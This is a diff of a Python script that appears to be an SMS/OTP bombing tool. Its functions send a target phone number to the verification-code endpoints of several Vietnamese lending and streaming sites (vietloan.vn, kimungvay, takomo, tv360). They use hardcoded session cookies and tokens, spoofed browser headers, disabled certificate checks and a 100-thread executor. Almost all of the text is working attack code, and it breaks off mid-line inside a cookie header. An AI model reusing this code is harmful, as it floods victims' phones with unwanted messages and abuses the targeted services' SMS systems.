@@ -1,29 +1,19 @@
-
-import time
-time.sleep(3)
-thanhcong=0
-thatbai=0
-#import
-import hashlib
-import random,re
-import string
-import urllib.parse
 import json
-import requests
-import sys
-from bs4 import BeautifulSoup
-import requests
 import random
-import json
-import string
-import time
-from concurrent.futures import ThreadPoolExecutor
-from lequangminh import*
+import sys
 import os
-#bỏ qua chứng chỉ ssl
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-#các hàm
+import string
+import requests
+import concurrent.futures, os, sys
+from concurrent.futures import ThreadPoolExecutor
+import time, random, re
+from time import sleep
+from datetime import datetime
+from bs4 import BeautifulSoup
+from fake_useragent import UserAgent
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 
 def generate_random_string(length):
     letters_and_digits = string.ascii_letters + string.digits
@@ -50,2059 +40,1973 @@ def random_string(length):
     return ''.join(random.choice(letters) for _ in range(length))
 mail = generate_random(10)+'@gmail.com'
 to=generate_random(53)+'-'+generate_random(86)+'-'+generate_random(121)+'_'+generate_random(2)+'-'+generate_random(94)+'-'+generate_random(3)+'_'+generate_random(9)+'-'+generate_random(15)+'_'+generate_random(17)+'-'+generate_random(39)+'_'+generate_random(85)+'_'+generate_random(34),
-threading = ThreadPoolExecutor(max_workers=int(100))
-from colorama import Fore
-thatbai=0
-day=0
 
-def call2(phone):
-    global thanhcong
-    global thatbai
-    cookies = {
-        '__cfruid': '63a37bafdcd9829166465852342b434e3776b4ae-1703855095',
-        '_gcl_au': '1.1.727757230.1703855098',
-        '_fbp': 'fb.1.1703855098188.1238484689',
-        '_gid': 'GA1.2.749926425.1703855098',
-        '_clck': '15quhef%7C2%7Cfhy%7C0%7C1458',
-        'mousestats_vi': '052f0ae63e6cd789411c',
-        'mousestats_si': 'd7e0d3d9c561f50ecd34',
-        '_tt_enable_cookie': '1',
-        '_ttp': 's-4nP6sF0_lgurBLCF1B-v21xWI',
-        '_ym_uid': '1703855103588718017',
-        '_ym_d': '1703855103',
-        '_ym_isad': '2',
-        '_ym_visorc': 'w',
-        'jslbrc': 'w.20231229130514e7ecb828-a64a-11ee-895c-3ef70195ea5e.A_GS',
-        'XSRF-TOKEN': 'eyJpdiI6IjB5aHdPNmR1NjR6dGxzUERkeGx1bVE9PSIsInZhbHVlIjoidnhMOVhFVkcweE85MHpsazAxS3RrZ1BMZTVTNXZkanB4MXd1bm5Jb0NtdGEydlBkbk5CODhKSTM2L3lQYlJ5MTRTQ3lVVVowc0JtR013QXNkRm1VRmxXdkZIZFpzaGEyUmp4Vy9uSW1nclNsOTIrdFJaSTVQWnBueXc1VDVRZHoiLCJtYWMiOiJmMGExMWJkZjQwZDYyMzFmMTFkNWYyYmJhZDc3MzM1OTlmOGEzMTc3OWI2ZDNkMTdlNTJiYzRmOTNlMzk0NGEzIiwidGFnIjoiIn0%3D',
-        'sessionid': 'eyJpdiI6IkdJYVRuM25xVHJOR0ZqblVOQkpMZ0E9PSIsInZhbHVlIjoiUGR4aU1HZytFMmFrbHdzQmxrRmZaaDN1ZzNSRkdJTnNBUkl3U2IybU5HMTBEN0JQNGkxL2lyV1Rub25tNkt2Mmh4WmRhc3RiSWdDekkxbndQUkVnbnBWczZWYnc0VmRLR3Bwdk94ZEVybnhnNFMzcXhGWEtnMzliMnRLdHlvbXYiLCJtYWMiOiIwYjU0YmI0ZGNmMGM1NGVmMTExNDU3YjAyM2EzYmMwZDdkYWYyZWYyZTM5NTAxMDE4NzkyMGI5MjcxMmE3MmJjIiwidGFnIjoiIn0%3D',
-        'utm_uid': 'eyJpdiI6IlcvNEJKSHZabXZzaE5sWHdDcy9wVlE9PSIsInZhbHVlIjoidkRaWE9nR3AzOHJKZHo4am5TOE1XU1lvb2RyeGczQzExOFRDZzhhWVZSZ0E1MW5oT2JXQU1kYllRSFRCN2Y3VS9kU2F6U3BVVm5NQ3JhaURIVTdkd2FjWXBBU0ZVckZJQXpPczc5eTA0U2gxZXRkUHBmd04zdDdZeDdRMm9xUnEiLCJtYWMiOiI5OGNkMDNjMmQ1MDJlYTRmMDc0YTVlMGE4NmFhYjdkZDI5ODZkZjYzZjFmYmU4MDc1YjIwMmFmYzliZDkwNmY2IiwidGFnIjoiIn0%3D',
-        '_ga_EBK41LH7H5': 'GS1.1.1703855098.1.1.1703855134.24.0.0',
-        '_ga': 'GA1.2.471021909.1703855098',
-        'ec_cache_utm': '81c4b696-a147-509d-1759-988edae7b0b9',
-        'ec_cache_client': 'false',
-        'ec_cache_client_utm': 'null',
-        'ec_png_utm': '81c4b696-a147-509d-1759-988edae7b0b9',
-        'ec_png_client': 'false',
-        'ec_png_client_utm': 'null',
-        'ec_etag_utm': '81c4b696-a147-509d-1759-988edae7b0b9',
-        'ec_etag_client': 'false',
-        'ec_etag_client_utm': 'null',
-        '_clsk': 'g7wdb4%7C1703855136127%7C4%7C1%7Cp.clarity.ms%2Fcollect',
-        'uid': '81c4b696-a147-509d-1759-988edae7b0b9',
-        'client': 'false',
-        'client_utm': 'null',
-    }
+def generate_random_email(domain='example.com'):
+    length = random.randint(5, 10)
+    email_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+    email = f'{email_name}@{domain}'
+    return email
 
-    headers = {
-        'authority': 'vietloan.vn',
+random_email = generate_random_email()
+
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
+]
+
+def get_random_user_agent():
+    return random.choice(user_agents)
+
+
+def tv360(phone):
+    try:
+        data = '{"msisdn":"phone"}'
+        data = data.replace("phone",phone)
+        head = {
+            "Host":"m.tv360.vn",
+            "accept":"application/json, text/plain, */*",
+            "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
+            "content-type":"application/json"
+        }
+        rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
+        hoanthanh("TV360", phone)
+    except:
+        error("TV360", phone)
+def robot(phone):
+    try:
+        cookies = {
+            '_fbp': 'fb.1.1720102725444.358598086701375218',
+            '_gcl_au': '1.1.619229570.1720102726',
+            'mousestats_vi': 'acaa606972ae539932c0',
+            '_tt_enable_cookie': '1',
+            '_ttp': 'tGf0fClVBAWb7n4wsYwyYbdPx5W',
+            '_ym_uid': '1720102728534641572',
+            '_ym_d': '1720102728',
+            '_gid': 'GA1.2.557208002.1720622172',
+            '_clck': '14x7a16%7C2%7Cfnc%7C0%7C1646',
+            '_ym_isad': '2',
+            '__cfruid': '92805d7d62cc6333c3436c959ecc099040706b4f-1720628273',
+            '_ym_visorc': 'w',
+            'XSRF-TOKEN': 'eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D',
+            'sessionid': 'eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D',
+            'utm_uid': 'eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D',
+            '_ga': 'GA1.2.1882430469.1720102726',
+            'ec_png_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
+            'ec_png_client': 'false',
+            'ec_png_client_utm': 'null',
+            'ec_cache_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
+            'ec_cache_client': 'false',
+            'ec_cache_client_utm': 'null',
+            'ec_etag_client': 'false',
+            'ec_etag_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
+            'ec_etag_client_utm': 'null',
+            '_clsk': '1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect',
+            '_ga_EBK41LH7H5': 'GS1.1.1720622171.4.1.1720628300.41.0.0',
+            'uid': '12044e63-ea79-83c1-269a-86ba3fc88165',
+            'client': 'false',
+            'client_utm': 'null',
+        }
+
+        headers = {
         'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
+        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'cache-control': 'no-cache',
         'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        # 'cookie': '__cfruid=63a37bafdcd9829166465852342b434e3776b4ae-1703855095; _gcl_au=1.1.727757230.1703855098; _fbp=fb.1.1703855098188.1238484689; _gid=GA1.2.749926425.1703855098; _clck=15quhef%7C2%7Cfhy%7C0%7C1458; mousestats_vi=052f0ae63e6cd789411c; mousestats_si=d7e0d3d9c561f50ecd34; _tt_enable_cookie=1; _ttp=s-4nP6sF0_lgurBLCF1B-v21xWI; _ym_uid=1703855103588718017; _ym_d=1703855103; _ym_isad=2; _ym_visorc=w; jslbrc=w.20231229130514e7ecb828-a64a-11ee-895c-3ef70195ea5e.A_GS; XSRF-TOKEN=eyJpdiI6IjB5aHdPNmR1NjR6dGxzUERkeGx1bVE9PSIsInZhbHVlIjoidnhMOVhFVkcweE85MHpsazAxS3RrZ1BMZTVTNXZkanB4MXd1bm5Jb0NtdGEydlBkbk5CODhKSTM2L3lQYlJ5MTRTQ3lVVVowc0JtR013QXNkRm1VRmxXdkZIZFpzaGEyUmp4Vy9uSW1nclNsOTIrdFJaSTVQWnBueXc1VDVRZHoiLCJtYWMiOiJmMGExMWJkZjQwZDYyMzFmMTFkNWYyYmJhZDc3MzM1OTlmOGEzMTc3OWI2ZDNkMTdlNTJiYzRmOTNlMzk0NGEzIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6IkdJYVRuM25xVHJOR0ZqblVOQkpMZ0E9PSIsInZhbHVlIjoiUGR4aU1HZytFMmFrbHdzQmxrRmZaaDN1ZzNSRkdJTnNBUkl3U2IybU5HMTBEN0JQNGkxL2lyV1Rub25tNkt2Mmh4WmRhc3RiSWdDekkxbndQUkVnbnBWczZWYnc0VmRLR3Bwdk94ZEVybnhnNFMzcXhGWEtnMzliMnRLdHlvbXYiLCJtYWMiOiIwYjU0YmI0ZGNmMGM1NGVmMTExNDU3YjAyM2EzYmMwZDdkYWYyZWYyZTM5NTAxMDE4NzkyMGI5MjcxMmE3MmJjIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlcvNEJKSHZabXZzaE5sWHdDcy9wVlE9PSIsInZhbHVlIjoidkRaWE9nR3AzOHJKZHo4am5TOE1XU1lvb2RyeGczQzExOFRDZzhhWVZSZ0E1MW5oT2JXQU1kYllRSFRCN2Y3VS9kU2F6U3BVVm5NQ3JhaURIVTdkd2FjWXBBU0ZVckZJQXpPczc5eTA0U2gxZXRkUHBmd04zdDdZeDdRMm9xUnEiLCJtYWMiOiI5OGNkMDNjMmQ1MDJlYTRmMDc0YTVlMGE4NmFhYjdkZDI5ODZkZjYzZjFmYmU4MDc1YjIwMmFmYzliZDkwNmY2IiwidGFnIjoiIn0%3D; _ga_EBK41LH7H5=GS1.1.1703855098.1.1.1703855134.24.0.0; _ga=GA1.2.471021909.1703855098; ec_cache_utm=81c4b696-a147-509d-1759-988edae7b0b9; ec_cache_client=false; ec_cache_client_utm=null; ec_png_utm=81c4b696-a147-509d-1759-988edae7b0b9; ec_png_client=false; ec_png_client_utm=null; ec_etag_utm=81c4b696-a147-509d-1759-988edae7b0b9; ec_etag_client=false; ec_etag_client_utm=null; _clsk=g7wdb4%7C1703855136127%7C4%7C1%7Cp.clarity.ms%2Fcollect; uid=81c4b696-a147-509d-1759-988edae7b0b9; client=false; client_utm=null',
-        'dnt': '1',
+        # 'cookie': '_fbp=fb.1.1720102725444.358598086701375218; _gcl_au=1.1.619229570.1720102726; mousestats_vi=acaa606972ae539932c0; _tt_enable_cookie=1; _ttp=tGf0fClVBAWb7n4wsYwyYbdPx5W; _ym_uid=1720102728534641572; _ym_d=1720102728; _gid=GA1.2.557208002.1720622172; _clck=14x7a16%7C2%7Cfnc%7C0%7C1646; _ym_isad=2; __cfruid=92805d7d62cc6333c3436c959ecc099040706b4f-1720628273; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D; _ga=GA1.2.1882430469.1720102726; ec_png_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_png_client=false; ec_png_client_utm=null; ec_cache_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_cache_client=false; ec_cache_client_utm=null; ec_etag_client=false; ec_etag_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_etag_client_utm=null; _clsk=1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect; _ga_EBK41LH7H5=GS1.1.1720622171.4.1.1720628300.41.0.0; uid=12044e63-ea79-83c1-269a-86ba3fc88165; client=false; client_utm=null',
         'origin': 'https://vietloan.vn',
+        'pragma': 'no-cache',
+        'priority': 'u=1, i',
         'referer': 'https://vietloan.vn/register',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
         'x-requested-with': 'XMLHttpRequest',
-    }
+        }
 
-    data = {
+        data = {
         'phone': phone,
-        '_token': 'LzSrVTbPGjnooEq6rDJnTv6FgLJs2MLlGIZxXwka',
-    }
+        '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
+        }
 
-    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data, timeout=30, verify=False)
-    if 'success' in response.text:
-        thanhcong+=1
-    else:
-        thatbai+=1
-#sms
-def call3(phone):
-    global thanhcong
-    global thatbai
-    headers = {
-        'Host': 'api.kimungvay.co',
-        # 'content-length': '73',
-        'accept': 'application/json, text/plain, */*',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://h5.kimungvay.site',
-        'x-requested-with': 'mark.via.gp',
-        'sec-fetch-site': 'cross-site',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-dest': 'empty',
-        'referer': 'https://h5.kimungvay.site/',
-        # 'accept-encoding': 'gzip, deflate, br',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-    }
-
-    data = {
-        'phone': f'{phone}',
-        'type': '2',
-        'ctype': '1',
-        'chntoken': 'e51d233aa164cb9ec126578fc2d553f6',
-    }
-    response = requests.post('https://api.kimungvay.co/h5/LoginMessage_ultimate', headers=headers, data=data, timeout=30, verify=False)
-    if 'successfully' in response.text:
-      thanhcong+=1
-    else:
-      thatbai+=1
-def call4(phone):
-    global thanhcong
-    global thatbai
-    cookies = {
+        response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
+        hoanthanh("VIETLOAN", phone)
+    except:
+        error("VIETLOAN", phone)
+def fb(phone):
+    try:
+        cookies = {
+        'con.unl.lat': '1720112400',
+        'con.unl.sc': '1',
+        '_gid': 'GA1.3.2048602791.1720189695',
         '_tt_enable_cookie': '1',
-        '_ttp': 'f-P_yvdwOUkXHDWa-KFeVqOb4Wi',
-        '_fw_crm_v': 'e52ba209-a5c6-4321-a346-6e6a67dec047',
-        '_hjSessionUser_2281843': 'eyJpZCI6ImM5MjY1YTI3LTQ1YWItNWUxZC04OTUwLTUyOTMxZDg0ZWY5ZSIsImNyZWF0ZWQiOjE2OTcyOTQwMjg1MzYsImV4aXN0aW5nIjp0cnVlfQ==',
-        '_hjSessionUser_2281853': 'eyJpZCI6IjVmZDdkZGZmLTZlMzItNWJiMi1hYzI3LTgzZjhhOWNlMmNlMCIsImNyZWF0ZWQiOjE2OTcyOTQwNTMyNDcsImV4aXN0aW5nIjp0cnVlfQ==',
-        '_ga_ZN0EBP68G5': 'GS1.1.1698416121.3.0.1698416121.60.0.0',
-        '_ga': 'GA1.2.1930964821.1697294026',
-        '_gid': 'GA1.2.1622182646.1703856647',
-        '_gat_UA-187725374-2': '1',
-        '_fbp': 'fb.1.1703856648592.667258868',
-        '_hjIncludedInSessionSample_2281843': '0',
-        '_hjSession_2281843': 'eyJpZCI6IjQwYjY2MzdhLWM5YWMtNDJjNy04NWU3LTNjNmQ4OGExMTRmYyIsImMiOjE3MDM4NTY2NDg3OTMsInMiOjAsInIiOjAsInNiIjowfQ==',
-        '_ga_2SRP4BGEXD': 'GS1.1.1703856646.1.0.1703856651.55.0.0',
-        '_ga_ZBQ18M247M': 'GS1.1.1703856646.3.0.1703856651.55.0.0',
-        '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDg2ODQxODA4OQ.L1D5PMjXLrblgQ-kevfx9MDp7PfNA91_Ln01iZ148QE',
-        '_gcl_au': '1.1.1700522238.1697294026.14100726.1703856654.1703856653',
+        '_ttp': 'loSwVu_AC7yj50Md2HhAQPUajHo',
+        '_clck': 'k364l7%7C2%7Cfn7%7C0%7C1647',
+        '_fbp': 'fb.2.1720189698853.917828572155116943',
+        '_hjSessionUser_1708983': 'eyJpZCI6IjZiZjVlNGY3LTQyNWMtNWQ1ZC05NzkwLTViYjdiNDFiOWU2YSIsImNyZWF0ZWQiOjE3MjAxODk2OTYyMTEsImV4aXN0aW5nIjp0cnVlfQ==',
+        '__zi': '3000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLincmF_oW0L0tINMkBs220wO8DswieL63fWYcRsrZaiEdJKvD0.1',
+        '_gcl_au': '1.1.888803755.1720189704',
+        'con.ses.id': '684bd57c-05df-40e6-8f09-cb91b12b83ee',
+        '_cfuvid': '7yRCvrBIxINMnm4CnbUMRUZmWAccGH2dDs_qb59ESSo-1720194527813-0.0.1.1-604800000',
+        '_gat_UA-3729099-1': '1',
+        '_hjSession_1708983': 'eyJpZCI6ImU5NzAwOTg4LWQzNDEtNGNhZS05ODNiLWU0ZmNjYzY1ZDA5YiIsImMiOjE3MjAxOTQ1MjkzMDYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=',
+        '_hjHasCachedUserAttributes': 'true',
+        '__gads': 'ID=09882b169dabe671:T=1720189697:RT=1720194530:S=ALNI_MbAkhD6GtaqnGMyaNCNq8Pbsgmczg',
+        '__gpi': 'UID=00000e7482c26bd1:T=1720189697:RT=1720194530:S=ALNI_MbttJ_DnsgUfO4krJdd8LQMEqUzaQ',
+        '__eoi': 'ID=05eb7c1e80c4dfec:T=1720189697:RT=1720194530:S=AA-AfjZGyVTvphkMg_RLDUYt6ivu',
+        'cf_clearance': 'CsP84lMQsTJ_VGvVF8ePeTzWAOaQrHaccFefKS2LJBc-1720194531-1.0.1.1-AX158eVwvwGl4Xpy_HXebkwMMooSVw.6mi28sn_a5RQ.CWi9_fjgwiYoHW_Z8kRtauREt.mnyZ0dKqrGt4rE3A',
+        'ab.storage.sessionId.892f88ed-1831-42b9-becb-90a189ce90ad': '%7B%22g%22%3A%22e2f1139a-b6ea-23ca-2c34-66f0afd8986a%22%2C%22e%22%3A1720196334327%2C%22c%22%3A1720194534327%2C%22l%22%3A1720194534327%7D',
+        'ab.storage.deviceId.892f88ed-1831-42b9-becb-90a189ce90ad': '%7B%22g%22%3A%22e5723b5d-14a5-7f2b-c287-dc660f0d0fb2%22%2C%22c%22%3A1720189700567%2C%22l%22%3A1720194534332%7D',
+        '_ga': 'GA1.3.697835917.1720189695',
+        '_clsk': 'lxz3ig%7C1720194550598%7C2%7C0%7Cz.clarity.ms%2Fcollect',
+        'con.unl.usr.id': '%7B%22key%22%3A%22userId%22%2C%22value%22%3A%2285b2f8ad-7fdd-4ac6-8711-9a462c66ea19%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7580977Z%22%7D',
+        'con.unl.cli.id': '%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22d6716aa9-48a6-47dd-890c-aec43dacd542%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7581682Z%22%7D',
+        '_ga_HTS298453C': 'GS1.1.1720194528.2.1.1720194561.27.0.0',
     }
 
-    headers = {
-        'authority': 'lk.takomo.vn',
+        headers = {
+
         'accept': 'application/json, text/plain, */*',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
-        'content-type': 'application/json;charset=UTF-8',
-        # 'cookie': '_tt_enable_cookie=1; _ttp=f-P_yvdwOUkXHDWa-KFeVqOb4Wi; _fw_crm_v=e52ba209-a5c6-4321-a346-6e6a67dec047; _hjSessionUser_2281843=eyJpZCI6ImM5MjY1YTI3LTQ1YWItNWUxZC04OTUwLTUyOTMxZDg0ZWY5ZSIsImNyZWF0ZWQiOjE2OTcyOTQwMjg1MzYsImV4aXN0aW5nIjp0cnVlfQ==; _hjSessionUser_2281853=eyJpZCI6IjVmZDdkZGZmLTZlMzItNWJiMi1hYzI3LTgzZjhhOWNlMmNlMCIsImNyZWF0ZWQiOjE2OTcyOTQwNTMyNDcsImV4aXN0aW5nIjp0cnVlfQ==; _ga_ZN0EBP68G5=GS1.1.1698416121.3.0.1698416121.60.0.0; _ga=GA1.2.1930964821.1697294026; _gid=GA1.2.1622182646.1703856647; _gat_UA-187725374-2=1; _fbp=fb.1.1703856648592.667258868; _hjIncludedInSessionSample_2281843=0; _hjSession_2281843=eyJpZCI6IjQwYjY2MzdhLWM5YWMtNDJjNy04NWU3LTNjNmQ4OGExMTRmYyIsImMiOjE3MDM4NTY2NDg3OTMsInMiOjAsInIiOjAsInNiIjowfQ==; _ga_2SRP4BGEXD=GS1.1.1703856646.1.0.1703856651.55.0.0; _ga_ZBQ18M247M=GS1.1.1703856646.3.0.1703856651.55.0.0; _cabinet_key=SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDg2ODQxODA4OQ.L1D5PMjXLrblgQ-kevfx9MDp7PfNA91_Ln01iZ148QE; _gcl_au=1.1.1700522238.1697294026.14100726.1703856654.1703856653',
-        'dnt': '1',
-        'origin': 'https://lk.takomo.vn',
-        'referer': 'https://lk.takomo.vn/?phone='+phone+'&amount=2000000&term=7&utm_source=direct_takomo&utm_medium=organic&utm_campaign=direct_takomo&utm_content=mainpage_submit',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'cache-control': 'no-cache',
+        # 'cookie': 'con.unl.lat=1720112400; con.unl.sc=1; _gid=GA1.3.2048602791.1720189695; _tt_enable_cookie=1; _ttp=loSwVu_AC7yj50Md2HhAQPUajHo; _clck=k364l7%7C2%7Cfn7%7C0%7C1647; _fbp=fb.2.1720189698853.917828572155116943; _hjSessionUser_1708983=eyJpZCI6IjZiZjVlNGY3LTQyNWMtNWQ1ZC05NzkwLTViYjdiNDFiOWU2YSIsImNyZWF0ZWQiOjE3MjAxODk2OTYyMTEsImV4aXN0aW5nIjp0cnVlfQ==; __zi=3000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLincmF_oW0L0tINMkBs220wO8DswieL63fWYcRsrZaiEdJKvD0.1; _gcl_au=1.1.888803755.1720189704; con.ses.id=684bd57c-05df-40e6-8f09-cb91b12b83ee; _cfuvid=7yRCvrBIxINMnm4CnbUMRUZmWAccGH2dDs_qb59ESSo-1720194527813-0.0.1.1-604800000; _gat_UA-3729099-1=1; _hjSession_1708983=eyJpZCI6ImU5NzAwOTg4LWQzNDEtNGNhZS05ODNiLWU0ZmNjYzY1ZDA5YiIsImMiOjE3MjAxOTQ1MjkzMDYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; _hjHasCachedUserAttributes=true; __gads=ID=09882b169dabe671:T=1720189697:RT=1720194530:S=ALNI_MbAkhD6GtaqnGMyaNCNq8Pbsgmczg; __gpi=UID=00000e7482c26bd1:T=1720189697:RT=1720194530:S=ALNI_MbttJ_DnsgUfO4krJdd8LQMEqUzaQ; __eoi=ID=05eb7c1e80c4dfec:T=1720189697:RT=1720194530:S=AA-AfjZGyVTvphkMg_RLDUYt6ivu; cf_clearance=CsP84lMQsTJ_VGvVF8ePeTzWAOaQrHaccFefKS2LJBc-1720194531-1.0.1.1-AX158eVwvwGl4Xpy_HXebkwMMooSVw.6mi28sn_a5RQ.CWi9_fjgwiYoHW_Z8kRtauREt.mnyZ0dKqrGt4rE3A; 